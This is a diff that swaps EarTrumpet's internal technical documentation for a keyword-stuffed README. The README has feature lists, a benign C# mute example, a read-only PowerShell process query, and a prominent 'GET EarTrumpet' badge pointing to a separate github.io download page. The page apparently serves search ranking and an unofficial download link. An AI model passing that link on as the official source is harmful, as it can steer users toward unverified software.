@@ -1,234 +1,182 @@
-# EarTrumpet Technical Documentation
+# EarTrumpet Volume Control for Windows Applications
+
+EarTrumpet Windows 11 users can balance application audio and manage playback devices from the notification area.
+EarTrumpet brings separate app sliders, device controls, and audio activity indicators into one interface.
+
+[![GET EarTrumpet](https://img.shields.io/badge/GET-EarTrumpet-7C3AED?style=flat-square&labelColor=312E81)](https://eartrumpet-windows-11.github.io/EarTrumpet/)
+
 ## Overview
-EarTrumpet is a Windows Presentation Foundation (WPF) app consisting of a notification area icon with a context menu, flyout and a volume mixer window. Changing the default device is available on the context menu. Hotkeys can be assigned in settings to invoke the flyout, volume mixer or open settings. The flyout and volume mixer have effectively the same controls, in both cases there is a hidden popup on each app session (type <kbd>space</kbd> or right click) that reveal sliders for each item in the app group (e.g. multiple Firefox sessions running).
 
-EarTrumpet uses the Windows Multimedia Device API to replace the system volume experience, enabling richer control of apps and devices through a modern UI with independent app controls.
+For people looking for eartrumpet volume control, the main benefit is direct access to individual application levels.
+The eartrumpet audio mixer also helps organize playback across speakers, headsets, and other available outputs.
+As an eartrumpet sound manager, it combines these controls with configurable shortcuts and Windows theme support.
 
-The flyout is created at startup and held ready for display. The volume mixer and settings windows are single-instance and created on demand.
+An application session and a playback device have different roles.
+Changing an app slider adjusts that application's session; changing a device level affects the selected output.
 
-## EarTrumpet.DataModel.AppInformation
-`AppInformationFactory` produces `IAppInfo` object from a process id (PID). Data (display name, icon location, background color, etc.) is uniquely extracted from desktop and modern apps. 
+| Control | Typical use | Scope |
+| --- | --- | --- |
+| Application volume | Lower music while keeping a meeting audible | Selected application session |
+| Application mute | Silence a noisy app temporarily | Selected application session |
+| Device volume | Adjust the level of connected speakers | Selected playback device |
+| Default playback device | Choose the usual output for applications | Windows playback preference |
+| App output selection | Send an application to another available output | Application routing |
+| Peak indicators | See which sessions currently produce audio | Activity display |
 
-### Zombie processes
-Lingering processes--processes that are dead but not yet cleaned up by the system--could show up in EarTrumpet.
+Audio routing depends on the devices and sessions exposed by Windows.
+Applications with their own output selection can also influence where their sound plays.
 
-#### Edge Content Process Repro
-1. Start Legacy Edge, navigate to Youtube Page 1.
-2. Add a tab and navigate to Youtube Page 2.
-3. Close Page 1 tab.
+## Features
 
-Observe: Zombie process is still in EarTrumpet.
+- Adjust application volume independently.
+- Mute individual sessions without closing their applications.
+- Move applications between available playback devices.
+- Manage the default playback output.
+- Inspect audio activity with channel-aware peak indicators.
+- Open a separate mixer window.
+- Use configurable keyboard shortcuts.
+- Match light or dark Windows appearance and accent colors.
 
-## EarTrumpet.DataModel.Audio
-### IAudioDeviceManager
-Manages an automatically updating observable collection of devices with a default device.
+![Application sliders and audio activity indicators in the EarTrumpet flyout](Graphics/logo1.jpg)
 
-### IAudioDevice
-Represents an audio device and its associated apps.
+The shared volume contract is defined in [IStreamWithVolumeControl.cs](EarTrumpet/DataModel/Audio/IStreamWithVolumeControl.cs).
+Device groups are represented by [IAudioDevice.cs](EarTrumpet/DataModel/Audio/IAudioDevice.cs).
+Session behavior is described by [IAudioDeviceSession.cs](EarTrumpet/DataModel/Audio/IAudioDeviceSession.cs).
+Windows playback management is implemented in [AudioDeviceManager.cs](EarTrumpet/DataModel/WindowsAudio/Internal/AudioDeviceManager.cs).
 
-### IAudioDeviceSession
-Represents an app with an open audio session.
+These layers keep the audio model separate from its visual controls.
+For developers working inside the source project, this example changes only the mute state of a supplied stream:
 
-## EarTrumpet.DataModel.Storage
-Settings are stored in a key/value store that is backed by Windows Storage or the registry, if the app is packaged or not respectively. `StorageFactory.GetSettings()` is used to retrieve and persist settings.
+```csharp
+using EarTrumpet.DataModel.Audio;
 
-### Windows Storage reliablity
-We have observed a high rate of failures (via telemetry) from the `Windows.Storage.ApplicationData.Current.LocalSettings.Values` API.
+static void SilenceStream(IStreamWithVolumeControl stream)
+{
+    stream.IsMuted = true;
+}
+```
 
-## EarTrumpet.DataModel
-### SystemSettings
-Accesses the user-configurable Windows settings that represent the user's personalization, accessibility, and globalization settings.
+The caller must obtain a valid stream from the application's audio model.
+This is a source-level example rather than a command to run against the installed app.
 
-### ProcessWatcherService
-`ProcessWatcherService` uses a background thread to wait (via `WaitForMultipleObjects`) on a list of process handles--processes EarTrumpet has audio sessions for--and waits to be signalled. This thread only waits for 5 seconds at a time, then dispatches notifications for any terminated processes.
+## Usage
 
-## EarTrumpet.DataModel.WindowsAudio
-The Windows audio implementation of `IAudioDeviceManager` and related interfaces.
+Open EarTrumpet from its notification area icon to inspect available playback devices and application sessions.
+Play some audio in the target application if its session is not yet visible.
 
-### Persisted output devices
-Windows has the facility to set the persisted playback device on a per-application basis. This setting is persisted however it is not reliably applied at startup. EarTrumpet mitigates this for the user by manually setting the persisted playback device.
+1. Locate the application under its current playback device.
+2. Adjust its slider while listening to the result.
+3. Use mute when you need silence without losing the chosen level.
+4. Use the application's routing control when another output is preferable.
+5. Check the destination device level if the routed application remains quiet.
 
-### Peak values
-To provide good performance, audio metering is sampled on a background thread, and then dispatched on the foreground thread as a batch.
+For meetings, lower background music while leaving the conversation level unchanged.
+For games, balance game audio and voice chat separately.
+For a desk with speakers and a headset, check both app routing and the default output.
 
-## EarTrumpet.Diagnosis
-### Bugsnag
-We use Bugsnag as our error reporting service. Secure (TLS) connections are made to notify.bugsnag.com at notification time.
+The compact window layout is declared in [FlyoutWindow.xaml](EarTrumpet/UI/Views/FlyoutWindow.xaml).
+Its presentation state is managed by [FlyoutViewModel.cs](EarTrumpet/UI/ViewModels/FlyoutViewModel.cs).
+Application rows use [AppItemView.xaml](EarTrumpet/UI/Views/AppItemView.xaml).
+The slider control is implemented in [VolumeSlider.cs](EarTrumpet/UI/Controls/VolumeSlider.cs).
 
-### CircularBufferTraceListener
-Contains a small internal buffer of log messages that are only shown at the users' request.
+![Playback devices and application routing controls in the EarTrumpet mixer](Graphics/logo2.jpg)
 
-### ErrorReporter
-Encapsulates the Bugsnag connection and manages the metadata that is sent at notification time.
+A separate mixer gives more room when several applications are active.
+Its window layout is defined in [FullWindow.xaml](EarTrumpet/UI/Views/FullWindow.xaml).
 
-### LocalDataExporter
-Transforms an `IAudioDeviceManager` into a string for debug purposes at the users' request.
+## Configuration
 
-### SnapshotData
-Contains metadata dictionaries populated during crash notification or at the users' request.
+Open EarTrumpet settings to review keyboard shortcuts and mouse behavior.
+Choose shortcuts that do not conflict with combinations already used by games or other utilities.
 
-## EarTrumpet.Extensibility
-Contains support for loading add-on assemblies.
+- Assign a shortcut for the flyout when frequent access matters.
+- Use a separate mixer shortcut if you regularly manage several sessions.
+- Review mouse settings before relying on tray gestures.
+- Check the selected output after connecting or disconnecting a headset.
 
-Add-ons must implement a single `IAddonLifecycle` in an external add-on assembly.
+Application preferences are managed by [AppSettings.cs](EarTrumpet/AppSettings.cs).
+The settings interface is declared in [SettingsWindow.xaml](EarTrumpet/UI/Views/SettingsWindow.xaml).
+Shortcut preferences are exposed by [EarTrumpetShortcutsPageViewModel.cs](EarTrumpet/UI/ViewModels/EarTrumpetShortcutsPageViewModel.cs).
+Storage selection is handled by [StorageFactory.cs](EarTrumpet/DataModel/Storage/StorageFactory.cs).
 
-## EarTrumpet.Extensibility.Hosting
-`AddonManager` uses an `AddonResolver` to load all applicable add-ons into an `AddonHost` (`AddonManager.Host`) where they can be accessed directly.
+Settings storage and runtime configuration serve different purposes.
+The following XML is a minimal runtime declaration matching the framework named in this source snapshot:
 
-### Assembly loading
-`AppDomain.CurrentDomain.AssemblyResolve` locates dependent assemblies residing in add-on directories.
-
-### Version selection
-Add-ons are placed in the `Versions\[EarTrumpet version]` folder. An add-on can support multiple versions of EarTrumpet in one package.
-
-If an compatible EarTrumpet version can't be found, the add-on won't be loaded. See `AddonResolver` for more details.
-
-## EarTrumpet.Extensibility.Shared
-Hosts **required** static global data.
-
-### ServiceBus
-Used for cross add-on communication. An add-on could register at `ApplicationLifecycleEvent.Startup` and another could retrieve the service at `ApplicationLifecycleEvent.Startup2`.
-
-## EarTrumpet.Interop
-Contains Platform Invoke (P/Invoke) declarations and interfaces.
-
-## EarTrumpet.Interop.Helpers
-Contains P/Invoke wrappers.
-
-## EarTrumpet.Interop.MMDeviceAPI
-Contains core audio COM interfaces and declarations, generated from `mmdevapi.idl`. This is done by exporting to a Type Library (TLB), importing into Visual Studio, and then copying the generated artifacts. 
-
-## EarTrumpet.UI
-## EarTrumpet.UI.Helpers
-### ShellNotifyIcon
-`Shell_NotifyIcon` is called directly because `System.Windows.Forms.NotifyIcon` does not support the newer `NOTIFICATIONDATAW` structure containing the `guidItem` member. This allows the Windows Shell to migrate notification icon settings when the app install location changes.
-
-#### Listening to mouse wheel scroll events
-The `Shell_NotifyIcon` API, as of Windows 10 1903, doesn't emit scroll events. To capture scroll events, EarTrumpet uses the following scheme:
-
-1. Windows Shell generates `WM_MOUSEMOVE` message in response to cursor movement.
-2. EarTrumpet calls `RegisterRawInputDevices` to request `WM_INPUT` (global raw mouse input) messages.
-3. `WM_INPUT` messages are processed until the cursor leaves the tray icon bounds (as defined by `Shell_NotifyIconGetRect`).
-
-## EarTrumpet.UI.Themes
-Contains WPF XAML resources used to configure the UI to resemble Windows themed UI.
-
-EarTrumpet supports all the Windows theme configurations:
-- High contrast
-- Light or dark theme (system or app)
-- Accent color (applied only to dark theme)
-- Transparency (applied to all sans high contrast)
-
-Historical insufficient solutions:
-- Split Styles and DataTemplates
-- Replacing a `ResourceDictionary` of Brushes
-
-`Theme:Brush` applies colors at runtime using a special declaration in XAML.
-
-### Brush
-Theme brush values are specified on elements in XAML:
 ```xml
-<TextBlock Theme:Brush.Foreground="SystemAccent" />
+<configuration>
+  <startup>
+    <supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.6.2" />
+  </startup>
+</configuration>
 ```
 
-The simplest value is a static color: `Red` or `#FFaabbcc` or `SystemAccentDark1`. These colors will apply to all theme configurations.
+This excerpt describes the application runtime.
+It is not an audio routing preset or a replacement for the complete configuration.
 
-Values can be set for Light, Dark and HighContrast configurations:
-```
-Light=LightChromeWhite, Dark=DarkChromeWhite, HighContrast=Highlight
-```
+## Requirements
 
-The same value can also be written as:
-```
-Theme={Theme}ChromeWhite, HighContrast=Highlight
-```
+EarTrumpet targets Windows audio playback management.
+Windows 10 and Windows 11 are the intended desktop environments for the application.
+A connected and enabled playback device is needed for useful output control.
 
-`{Theme}` is a variable that is replaced with `Light` or `Dark` as applicable.
+The source project uses C# and Windows Presentation Foundation.
+Source builds require the Windows development tools and dependencies appropriate to the downloaded revision.
 
-The color channel alpha may be optionally modified using a value between `0.0-1.0`:
-```
-Color/<TransparencySetting:On|Off>
-Color/<TransparencySetting:On>/<TransparencySetting:Off>
-```
+Project references and build settings appear in [EarTrumpet.csproj](EarTrumpet/EarTrumpet.csproj).
+The complete runtime configuration is in [App.config](EarTrumpet/App.config).
+Packaged application declarations are in [Package.appxmanifest](EarTrumpet.Package/Package.appxmanifest).
 
-Example:
-```
-Light=LightChromeWhite/0.8
-Light=LightChromeWhite/0.8/1
-```
+Microphone recording controls, equalization, and virtual audio cables are separate capabilities.
+Do not assume they are provided by the playback mixer described here.
 
-This allows colors to be opaque when transparency isn't being used.
+## Internationalization
 
-Brush values reference colors located by:
-- `System.Windows.Media.ColorConverter.ConvertFromString("*ColorName*")` (.e.g `#aa000000`)
-- `EarTrumpet.Interop.ImmersiveSystemColors.Lookup("*ColorName*")` API (e.g. `SystemAccent1`)
-- `System.Windows.Media.Colors.*ColorName*` (e.g. `Red`)
-- `System.Windows.Media.SystemColors.*ColorName*` (e.g. `HotTrack`, for high contrast)
-- A reference like `<Theme:Ref Key="*ColorName*">` in `App.xaml`.
+EarTrumpet includes localized interface resources.
+Translations help keep device controls, settings, and application actions understandable across languages.
 
-#### Theme Manager references
-Complex brush values can be built up using nested `<Theme:Ref.Rules>` and then referenced like a static color.
+The base resource set is [Resources.resx](EarTrumpet/Properties/Resources.resx).
+Russian interface strings are in [Resources.ru-RU.resx](EarTrumpet/Properties/Resources.ru-RU.resx).
+German interface strings are in [Resources.de-DE.resx](EarTrumpet/Properties/Resources.de-DE.resx).
 
-The `Rules` collection is traversed, evaluating each `Rule` using the following scheme:
-1. Evaluate `On` condition
-  - If True: Use `Value` or evaluate `Rules`
-  - If False: Continue to next `Rule`
+When reviewing translations, preserve resource identifiers and formatting placeholders.
+Check short labels in their actual controls because a correct translation can still exceed the available space.
 
-Once a `Rules` collection is entered, it must terminate with a `Value` or continue to a deeper `Rules` collection, not go back to the parent looking for a match.
+## Support
 
-If no rule is found at the end, this is an programming error. Ensure that the last rule is `On=Any` (the default) to prevent this.
+If EarTrumpet is not opening, first check whether its process is already running.
+The following read-only PowerShell example reports matching processes and their window titles:
 
-#### Theme:Options.Source
-Set at the top level window and may be `App` or `System`. This specifies the theme configuration source (from `SystemSettings`). Taskbar and flyout UI use the `System` theme, while other top-level windows use the `App` theme.
-
-#### Theme:Options.Scope
-This is used to specify different colors between the flyout and other experiences irrespective of theme configuration.
-
-Adding scope requires that the same tokens (Light, Dark, HighContrast) be specified equally for both scopes (even if they are the same).
-
-Example:
-```
-Flyout:Theme=Red, Flyout:HighContrast=HotTrack, :Theme=Blue, :HighContrast=HotTrack
+```powershell
+Get-Process -Name EarTrumpet -ErrorAction SilentlyContinue |
+    Select-Object Id, ProcessName, MainWindowTitle
 ```
 
-In this instance the flyout will use the red color, while other surfaces will use blue. High contrast will always be `HotTrack`.
+No output means this query did not find a matching process.
+An empty window title alone does not establish a fault in a notification area application.
 
-#### Theme:OS
-Contains OS-specific dependency properties (only `IsWindows11` at this time) used for theming across multiple OS versions.
+For missing audio, inspect the application's mute state, its selected output, and the destination device volume.
+For a missing session, start playback in that app and inspect its own audio settings.
+For routing problems, record whether they began after a device change or Windows update.
 
-#### Adding a new Theme:Brush.*Property*
-Because Brush uses Reflection, properties are identified by string name only. This is to avoid having to special case certain elements when a property exists with the same name on many common types of elements.
+Process exit monitoring is implemented in [ProcessWatcherService.cs](EarTrumpet/DataModel/ProcessWatcherService.cs).
+Diagnostic snapshot structures are defined in [SnapshotData.cs](EarTrumpet/Diagnosis/SnapshotData.cs).
+Error reporting integration is implemented in [ErrorReporter.cs](EarTrumpet/Diagnosis/ErrorReporter.cs).
 
-Adding a new brush should be accomplished by copying a block in `Brush.cs`.
+A useful issue report includes the Windows version, EarTrumpet version, affected application, and playback device.
+Describe the steps that reproduce the problem and whether other applications are affected.
 
-### Moving audio sessions between devices
-The view-model layer virtualizes moving sessions across devices. This virtualization is necessary for the case where the user moves a session that has an `Inactive` state. In this case, Windows will not move the session to the new device until the next time the stream becomes `Active`, resulting in incorrect placement in the UI.
+## Contributing
 
-## Build
-EarTrumpet only targets x86. Some P/Invokes will need to be updated if targeting x64 or other platforms.
+Keep changes focused on a specific behavior, interface issue, or translation improvement.
+Explain the observed result and the result you expected before proposing an implementation.
 
-See [Compiling](../COMPILING.md) for more information.
+Build preparation logic is available in [prebuild.ps1](EarTrumpet/prebuild.ps1).
+Windows audio policy integration is implemented in [AudioPolicyConfigService.cs](EarTrumpet/DataModel/WindowsAudio/Internal/AudioPolicyConfigService.cs).
 
-### Prebuild script: prebuild.ps1
-Updates `AssemblyInfo.cs` (binary file version info) and the package `AppxManifest.xml` are kept in sync. `Version.txt` is the source of truth for the version.
+When changing audio behavior, check application mute, device changes, and session appearance.
+When changing the interface, review both light and dark themes and keyboard access.
+When submitting a translation, retain existing keys and test labels in context.
 
-## Debugging
-EarTrumpet can be debugged via the `EarTrumpet` project, or via the `EarTrumpet.Package` project, which is slower but enables debugging the packaged app.
+## Related Search Terms
 
-### VSDebug configuration
-`VSDebug` mode enables the following features over `Debug` mode:
-- `TemporaryAppItemViewModel` is marked with a red background color.
-- Avoid the app identity check which causes a handled startup exception.
-
-## Miscellaneous test reminders
-- Taskbar top/left/right/bottom (consider RTL!)
-- Taskbar auto-hide
-- Per-monitor DPI (Settings > change the scale for only one display on a multi-display system)
-- Theme pivots: light/dark, Use accent color, Use transparency
-- High contrast
-- UIAutomation / accessibility
-- Keyboard, Touch, Mouse input
-- Move taskbar to non-primary display (different DPI)
-- Move an audio session that is not currently playing sound
-- Remote desktop
-- Device add/remove
+EarTrumpet Windows 11, EarTrumpet, eartrumpet volume control, eartrumpet audio mixer, eartrumpet sound manager, audio, eartrumpet, microsoft-store, mixer, playback-devices, windows, wpf, sound, volume-control, windows-11
